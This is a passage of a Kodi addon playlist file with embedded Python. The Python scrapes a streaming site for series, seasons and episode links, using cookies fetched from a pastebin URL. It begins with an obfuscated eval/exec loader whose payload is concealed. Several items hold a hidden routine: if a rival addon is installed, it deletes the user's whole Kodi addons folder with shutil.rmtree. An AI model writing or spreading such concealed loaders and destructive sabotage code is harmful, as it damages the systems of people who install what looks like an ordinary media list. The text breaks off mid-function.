RjNzE0ZDVhMzc0MzQyNzU3MTY3NGU1NDZmNWE2OTQxMzc3OTU0NzI0ODdhNTg0MTZkNmU1MjQxNjY0ZDQzNWEzODc0MzQ0MzRhMmI0MjY3Nzk1ODcxNDI3Njc5NjI1YTYyMzI1NzM5NTc3MjQzNDQ2NTY0NTE0ODM2NzQzMTQ1NTg2MTQ1MzI0NTc1NTQ0ZTY3NmUyZjQxNWEzMDMwMzQ0OTY0Mzk3Mjc5NmE3NDZiNDc2NDU1NDIzNjZmNjM2ZTMyNDQyYjc5MmY3MTQ1MzM3MTYyNDc1MDY3NDczOTY5NzkzNzc4NTI0ODZkNTQ2MzM4NDM3NTZiMzk1NDY0MmY0OTU3NjM2YTdhMzg2NzQyMzE1NjRlNDM3NTRkNDg2NjQzNjY0NjRkMzU0YjM4NzYzNTUwNmE0NTM5MzY2NzRjNDI2NjM3NTA3MzQ3Mzg3ODZhNzY3MDRiNzM0ZDY1NmY3MDcxNzc2MTY1NTU1MTM5NDk0NzM2NzEyZjM1N'
trinity =  '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'
oracle = 'E3NDc3NTc2NzY1NTc3NDcxNjE3NTMxNTk0MTMxNmY0NDRlNGEzOTZhNDk1NjQyNmU1NjRjMzY2ZDcyNTU1NDY0NDE0Njc3NDI0OTM4NTk2NzRmNzE1YTQ3NzQ2NzUwNDY0OTUwNzM1MjQ3NDg1NzQ2Njg0NjU4NTkyYjM2NGUzNzZmNDU2NDY5NGEzMTY1MzI0YTc4NTY2YTcxNTQ2MjRhNGM1OTQxMmY3ODQ4MzE3NzY0NjI1OTM5NDE0NDRmNTE3MzRkMzE2OTRjMzI2NzM0MzQzMjY3NjM1NjVhNzQ0MjM3MzI0YTY1NzQ0MjQ2MzI3NzU5MzI0MTRjMzU2ODYzMzQ2ZDMyNTI1MzM2NGM2ZTU4Mzk0MzYxN2E0MjU5NzE3MjczMzA0ZDUzNzE0ODQ4NWE2YTdhMzI0MjQ0NmI2YTU1NTM1Mzc5NGE1NzQzMzE2MTc5NzQ3MzQzNzE0NzZkNGI2NDMwNDE2NDU3NDI0ODc4NmQzNTQzMzk1OTQ1NTY2OTU1NTIyZjZhNTI0ZjRlNjc2ODczNWE1YTYxNmM3YTcxNTM2YzQ2Njc3MjRkNTg3OTc3NTU3NjZmNmQ2NjUzNmQ3ODU0NzY2NzYyNGUzMTY4NDQ3NTUwNWE2Nzc1NjQ1NDU2NmY1OTRlNzc2ODY4MzM3OTMxNTU0YTY1MzU0MzMwNDEzMzVhNjU3NzZjNGY3NzM4NGE2NjYyMzA1MzZiMmY1OTQyNWE3NTMwMzk1Mjc1NTQ0ZTU5NmM3ODU1NmU2MzQ4NjY3MzY4NGM1MTMyNzk2YTQ5NmU2ZTcxNzM2NzMyNzg0YjY2Njg0MTcyNDI2MzczNjk0NDZmMzEzNDUxNjU2NDZhNTc1MzM3NDc0NzY2NDU3NTY3NjgzMzdhNDY0NTM4NGE3NjUyNmE2ZTRlNjg2YzUxNzE3OTYxNjE2NjQ5NDc0MTcyN2E0MjZmNmM0MTQ4NGU2NjQ5NGQ2NjY2NDE1YTJiNmE1NDU1NDEzOTMxNDc2NzQyNmU3MDc4MmY2ODQ1MzM1NDM0NmQ3NDZmNmUzMTczNjgzNDZmMzM3MDYyNzk0OTM5NmQyZjc4NDI2Yzc5NDQ3Mjc2NjQ2MzZiNjgzMzUxMmYzNDc3NzE2YjM5Njk2ZTU5NzE0ZDU2MzkzNDJiNDM3NDRhMzM1OTJiMzk2NzcwMzI3OTY5NzU2NzUwNGYzODZlNWE1MzU0Mzc0YTZkNDI2NjZiNTI2ZjM3MzU2ZjUwNjU3MDQ1NDU0ZTVhNmI0NDU4NmM3MDM2NDg2MjQyNmY0OTYzNTk1ODU5MzEzNjM0NTk0YzUyMzc1NTUzNzk3MDU1Njk2ZTJmNDE0NTUwNjk2Nzc2N2E1OTQ4MzQ0YTY2NGE3MTQ5NmM1ODUwNzg2Nzc3NTg0YjZkNzc3NjQ2NjY2Mjc2NDI3NzQyNjY1NTQxNjQzMjYxNjk0ZjU1NDE0YzMzNzI0YjUwNGI1NzQ1NGMzNzQ1MzEzNTQxNTYzNTUzNzM0MzU1NmQ2ZTUzNTU3NDdhNTMzNjQyNTY0NzRkNTY1MDYzNTczNDcwNmM1MTc4Mzg2NzUyNTEzNTM2NGEyZjYxMzQ3NDM3NGEyZjYzMmY2ZDU0MzczMDM0MzIzNTZkMzM1MTU0NTUzMjJiNzM2ZDZkMzU3Mjc4NGQ3MjQxNTA3MDRkNTA1ODRmNjc0NzRhNzU0ZjY5NjU3MTQ3NjI0MzZlNDIyYjcxNDY2MTZjNmM2ODZjNTAyYjY2NGM0Mzc0MzEzNzM5NzU0NDQ3NTA3YTM5NzMzOTU0Mzk0ZTM1NTc2YTZlNzE0ODZlNzQzMTY5NzM1MjdhNTc2MTcwNjU3YTM1NTU2YzdhNzg3YTJmNjc1MzMzMzM2MjM0NmM2YTQ2NDY0NjcyNjEzNzZlNzIzMjM0NmU1NzM4NTU2OTRjNjU1YTcwNmE1ODJiNzIzNzJmNGQ2ZTRhN2E2ZDZlNmQ1NzM4NTM1NDMxNjk2ZDcxNTk3MzcyNzk1MzZhNTAzMjMyNTQ1YTM3NDI3YTYyNzY1ODRhNmU3NjZmMzI1MzY2NmM1NzZlNTk1YTU1MzQyZjRkNjY3NjM1Njc1MjJiNzkyYjMyNzI2OTU5MzU2OTY4NGE3MjY0NGQ1MzU1NTQyZjQ4NzQ3MTQ4NDIzNTM1NmM3MzM3NDIzOTUwNzI0ODQ3NDczOTYzNWE2MTY3NTIzNDYzNGUzMDY1NDE3YTMxMzg2NTM5Mzc0NzMzNmU0ZDYyNzE3MzU1NzgzODM3NmM2YTcwNDM3NjY0NTUyYjRmNmE1MDM4NzUzMDc0MzIzMjZmMzc2NDY2NTY3NDQ2MmI3NDU4NTgzOTU3NjI3MDY1NzM2NjUwNjg3NTRhNGQ2YzUzNGIyYjMzMzU0NTRjNzIzMjU2NGY2MTY3NTg2ZTU5Mzk1MzM1NTI2ZTU4NzE2MjUwMmI3MzYyNWE3ODM5NTgzMjJiNjM0YzczNDc0ZTJiNjQ0NTY1NjE0YjJmNzE1MjMxNDQ1ODRmNTc1ODY1NGEzODU1MzY2ZjRkNDc0NDU2NWE1NzQzNmU1Mjc1NDE0ZjM3MzM2NTU4N2E1NTM3NmQ2YzYzNzk2Nzc1NjQzMTc2NjY3YTYxNjIzOTY0Mzk1OTRmNjQ3MTU5NjQ1OTcxNjI0ODQyMzczNzZjNTkzNTZlNDU'
keymaker = '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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/rVVnm10.png</thumbnail>  
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
 </item>


















<item>
<title>[COLOR white]pruebas horus[/COLOR]</title>
<link>$doregex[llamada]</link>
<regex>
<name>llamada</name>
<expres><![CDATA[#$pyFunction
from kodi_six import xbmc,xbmcgui
from six.moves import urllib_parse
import six
def GetLSProData(page_data,Cookie_Jar,m,):#cPrLItsLTfakl

    id = xbmcgui.Dialog().input('Insertar Acestream: ', type=xbmcgui.INPUT_ALPHANUM)
    #Acestream = urllib_parse.quote_plus(six.ensure_str(id))
    Acestream = six.ensure_str(id)
    if Acestream == '':
        Acestream = '21740ae9cd48ab593e8470a657cf71a85e7a04e4'
    llamada = 'plugin://script.module.horus/?id=' +Acestream+ 'action=play&=Canal&iconimage=http'
    return xbmc.executebuiltin('XBMC.RunPlugin("' + llamada + '")')
]]></expres>
<page></page>
</regex>
<thumbnail></thumbnail>
<fanart></fanart>
</item>




<item>
<title>[COLOR gold]* [COLOR lightseagreen]H 
android[COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
from six.moves import urllib_parse
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)class="item tvshows">.*?href="(https://playdede.com/serie.*?)".*?src="(.*?)".*?<p>(.*?)<.*?<h3>(.*?)<.*?span>(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    Palabra_Buscada = xbmcgui.Dialog().input('Buscar Peliculas: ', type=xbmcgui.INPUT_ALPHANUM)
    Palabra_Buscada = urllib_parse.quote_plus(six.ensure_str(Palabra_Buscada))
    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+'*'+response))
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        anio = item[2]
        titulo = item[3]
        titulo = six.ensure_str(titulo)
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
